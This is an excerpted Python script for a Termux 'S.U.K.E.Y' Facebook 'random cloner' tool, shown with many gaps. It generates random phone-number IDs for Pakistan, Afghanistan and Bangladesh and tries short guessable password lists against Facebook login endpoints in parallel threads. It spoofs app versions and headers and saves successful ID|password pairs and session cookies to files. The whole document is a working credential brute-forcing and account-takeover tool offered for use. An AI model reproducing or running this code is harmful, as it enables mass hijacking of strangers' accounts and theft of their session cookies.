# open source by HASHISH100 | ASMIT KHADKA
# Github HASHISH100
# if you want to re edit this code give credits to WEED LOVER
...
os.system('clear')
print('\n\033[1;37m Loading S.U.K.E.Y Tools...')
try:
...
try:
    prox= requests.get('https://github.com/HASHISH100/usmeet.txt').text
...
android_models=[]
try:
    xx = requests.get('https://github.com/HASHISH100/Approvel.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
usr=[]
try:
    xd=requests.get('https://github.com/HASHISH100/usmeet.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
# open source by HASHISH100 | ASMITKHADKA
# Github HASHISH100
# if you want to re edit this code give credits to WEED LOVER
# if you dont want to give credits look at your self again
...
android_models=[]
try:
    xx = requests.get('https://github.com/HASHISH100/usmeet.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
usr=[]
...
def aprv():
    ...
    if k in r:
        ...
        print("\033[1;92mYour Token is successfully Approved\33[1;37m")
                ...
                os.system("xdg-open https://www.facebook.com/profile.php?id=61554248671435txt={k}")
                aprv()
                sys.exit()
                
                
                
logo=(""" \033[1;37m__       __  ________       ________  _______        
    \033[1;34m/  |  _  /  |/        |     /        |/       \       
    \033[1;32m$$ | / \ $$ |$$$$$$$$/      $$$$$$$$/ $$$$$$$  |      
    \033[1;31m$$ |/$  \$$ |$$ |__  ______ $$ |__    $$ |  $$ |      
    \033[1;33m$$ /$$$  $$ |$$    |/      |$$    |   $$ |  $$ |      
    \033[1;36m$$ $$/$$ $$ |$$$$$/ $$$$$$/ $$$$$/    $$ |  $$ |      
    \033[1;30m$$$$/  $$$$ |$$ |_____      $$ |_____ $$ |__$$ |      
    \033[1;32m$$$/    $$$ |$$       |     $$       |$$    $$/       
    \033[1;34m$$/      $$/ $$$$$$$$/      $$$$$$$$/ $$$$$$$/        
\x1b[1;97m ---------------------------------------------
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Owner   :  US MEET
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook:  S.U.K.E.Y 
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                clear()
                                print('\t\x1b[1;92m     S.U.K.E.Y TOOL PASSWORD MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m  S.U.K.E.Y TOOL ACCOUNTS DISPLAY MENU')
                                linex()
                                ...
                                print('\033[1;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/S.U.K.E.Y-COOKIE.txt') 
                                print('\033[1;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/S.U.K.E.Y-OK.txt')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                        elif xd in ['2','02']:
                                clear()
                                print('\t\x1b[1;92m   S.U.K.E.Y TOOL RANDOM CLONING MENU')
                                linex()
                                ...
                                os.system('xdg-open https://www.facebook.com/S.U.K.E.Ykhano71');menu()
                        elif xd in ['4','04']:
                        	     os.system('xdg-open https://chat.whatsapp.com/HjFjl6UTo3VFbT0wI7zNFN');menu()
                        elif xd in ['0','00']:
                                clear()
                                print('\t\x1b[1;92m   EXIT FROM S.U.K.E.Y TOOL')
                                linex()
                                input('\033[1;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
                                os.system('xdg-open https://www.facebook.com/S.U.K.E.Ykhano71');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE S.U.K.E.Y TOOL');time.sleep(2);linex();exit() 
                        else:
...
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  S.U.K.E.Y TOOL PAK RANDOM CLONER MENU')
                linex()
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as S.U.K.E.Y:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;97mCode Teaches You How To Face Big Problems ! ')
                        print('\033[1;97mYour Mind Is Your Best Weapons ! ')
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khan123','khan12345','baloch123','baloch786','i love you','khankhan','baloch','khattak','khattak123','ali123','ali786','S.U.K.E.Y123']
                                S.U.K.E.Y.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                ...
                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/S.U.K.E.Y-rndm-COOKIE.txt') 
                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/S.U.K.E.Y-rndm-OK.txt')
                linex()
...
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  S.U.K.E.Y TOOL AFG RANDOM CLONER MENU')
                linex()
...
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mS.U.K.E.Y TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[S.U.K.E.Y-M1]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        S.U.K.E.Y=session.cookies.get_dict().keys()
                        if "c_user" in S.U.K.E.Y:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;92m[S.U.K.E.Y-OK] %s | %s'%(ids,pas))
                                open('/sdcard/S.U.K.E.Y-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/S.U.K.E.Y-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in S.U.K.E.Y:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m[S.U.K.E.Y-CP]  '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/S.U.K.E.Y-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api4(self,uid,first,last):
        global loop,oks,cps
        sys.stdout.write('\\\33[1;37m [S.U.K.E.Y-M4] %s|OK/%s CP/%s\33[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in S.U.K.E.Y:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\\\33[1;32m [S.U.K.E.Y-OK] %s | %s'%(ids,pas))
                                open('/sdcard/S.U.K.E.Y-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in S.U.K.E.Y:
...
def api(ids,names,passlist):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [S.U.K.E.Y] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[S.U.K.E.Y-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/S.U.K.E.Y_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/S.U.K.E.Y_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[S.U.K.E.Y-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/S.U.K.E.Y_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [S.U.K.E.Y-KING-M3] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[LEGEN-S.U.K.E.Y-OK]  '+ids+' | '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/S.U.K.E.Y-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [S.U.K.E.Y-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/S.U.K.E.Y-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [S.U.K.E.Y-RANDOM] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/S.U.K.E.Y-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [S.U.K.E.Y-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/S.U.K.E.Y-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [S.U.K.E.Y-OK] '+uid+' | '+pas+'\033[1;97m')
